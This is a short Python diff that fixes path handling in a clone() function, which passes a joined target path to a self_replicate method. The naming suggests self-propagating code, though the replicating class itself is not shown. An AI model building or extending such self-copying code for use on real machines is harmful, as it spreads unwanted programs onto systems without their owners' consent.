@@ -59,9 +59,10 @@ def main():
 
 def clone(file_path, filename):
     try:
-        fullpath=os.getcwd()
+        currentpath=os.getcwd()
+        fullpath =os.path.join(currentpath, filename)
         self_clone = replicate(file_path, fullpath)
-        self_clone.self_replicate(platform.system(),file_path, filename)
+        self_clone.self_replicate(platform.system(),file_path, fullpath)
     except Exception as e:
         print("Clone Error: {}".format(e))
         
